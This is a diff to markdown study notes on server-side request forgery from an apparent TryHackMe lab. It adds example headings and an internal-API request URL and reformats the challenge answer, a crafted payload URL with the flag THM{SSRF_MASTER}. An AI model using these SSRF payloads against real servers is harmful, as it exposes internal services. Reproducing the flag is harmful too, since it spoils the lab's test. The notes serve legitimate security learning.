@@ -560,12 +560,20 @@ The below example shows how the attacker can have complete control over the page
 The Expected Request is what the website.thm server is expecting to receive, with the section in red being the URL that the website will fetch for the information.
 The attacker can modify the area in red to an URL of their choice. 
 
+**EX1**  
 ![ssrf](./media/5-ssrf-ex1.png)
 
+http://website.thm/stock?url=`http://api.website.thm/api/user`
+
+
+
+**EX2**
 The below example shows how an attacker can still reach the /api/user page with only having control over the path by utilising directory traversal. When website.thm receives ../ this is a message to move up a directory which removes the /stock portion of the request and turns the final request into /api/user
 
 ![ssrf](./media/5-ssrf-ex2.png)
 
+
+**EX3**
 In this example, the attacker can control the server's subdomain to which the request is made. Take note of the payload ending in &x= being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string.
 
 ![ssrf](./media/5-ssrf-ex3.png)
@@ -582,7 +590,7 @@ http://website.thm/stock?url=http://hacker-domain.thm/
 
 Challenge answer
 
-`https://website.thm/item/2?server=server.website.thm/flag?id=9&x=id=2`
+`https://website.thm/item/2?server=server.website.thm/flag?id=9&x=id=2`  
 THM{SSRF_MASTER}
 
 ### FINDING AN SSRF 
